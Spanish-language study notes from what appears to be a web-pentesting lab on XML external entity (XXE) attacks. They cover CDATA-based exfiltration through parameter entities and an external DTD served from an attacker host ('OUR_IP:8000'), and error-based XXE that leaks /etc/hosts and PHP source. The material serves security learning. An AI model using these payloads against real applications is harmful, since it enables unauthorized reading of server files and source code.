
Algunos formatos de archivos pueden no ser legibles a traves de XXE basico mientras otros casos la aplicacion web puede no mostrar ningun valor de entrada en algunas instancias por lo que podemos intentar forzarlo a traves de errores


## Exfiltracion avanzada con CDATA

Vimos como pudimos usar filtros PHP para codificar archivos de codigo fuente PHP para que no rompiera el formato XML

Para mostrar otros archivos que no se ajustan al formato XML podemos envolver el contenido de la referencia con la etiqueta `<![CDATA[CONTENIDO]]>`

Esto lo haremos de la siguiente forma:

```
<!DOCTYPE email [ 
	<!ENTITY begin "<![CDATA["> 
	<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php"> --> EXTERNO
	<!ENTITY end "]]>"> 
	<!ENTITY joined "&begin;&file;&end;"> --> INTERNO
]>
```

Y tendremos que referenciar `&joined;`

Pero esto NO FUNCIONARA porque XML no permite unir entidades internas y externas

Para eludirlo usaremos Entidades de Parametro XML como `%` haciendo que todas ellas se consideren externas:

```
<!ENTITY joined "%begin;%file;%end;">
```

#### EJEMPLO LEYENDO UN ARCHIVO INTENRO

1. Creamos el DTD externo que sustituira a la ENITITY interna

```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
![[Pasted image 20260725001057.png]]

2. Creamos las ENTIDADES usando CDATA y haciendo que todas sean externas. Llamaremos a xxe para poder referenciar a la ENITITY joined que esta dentro del archivo xee

```
<!DOCTYPE email [ 
	<!ENTITY % begin "<![CDATA["> 
	<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
	<!ENTITY % end "]]>"> 
	<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
	 %xxe; 
 ]>
 ... 
 <email>&joined;</email>
```
![[Pasted image 20260725001204.png]]
![[Pasted image 20260725001315.png]]


	En algunos servidores web modernos, es posible que no podamos leer algunos archivos (como index.php), ya que el servidor web estaría previniendo un ataque DoS causado por la autorreferencia de archivos/entidades


## XXE Basado en Errores

Podria ser que la aplicacion no diera ninguna salida por lo que no podemos controlar ninguna ENITITY de la entrada XML

Si la aplicacion web muestra errores en tiempo de ejecucion (como errores PHP) y no tiene un manejo de excepciones adecuado para la entrada XML, podemos usarlo para leer en la salida del error el XXE

Vamos a ir al directorio `/error` para probarlo. Ninguna de las entidades se muestra por pantalla

Si mandamos datos malformados vemos que la web muestra un mensaje de error. Para ello hemos borrado previamente una etiqueta como \<root> o referenciamos una entidad inexistente

![[Pasted image 20260725001752.png]]

Generamos un error que dio como salida el webroot que podemos usar para leer el cofigo fuente

1. Alojamos un DTD en nuestra maquina atacante que nos permita leer un archivo local

```
<!ENTITY % file SYSTEM "file:///etc/hosts"> 
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Debido al %nonExistingEntity la pagina web lanzara un error diciendo que esta entidad no existe, junto con nuestro `%file;` unido como parte del error

2. Llamamos a nuestro DTD y luego referenciamos la entidad error:

```
<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
	%remote; 
	%error; 
]>
...
&error;
```
![[Pasted image 20260725002154.png]]![[Pasted image 20260725002207.png]]

Este método también puede usarse para leer el código fuente de los archivos:

```
file:///var/www/html/submitDetails.php
```
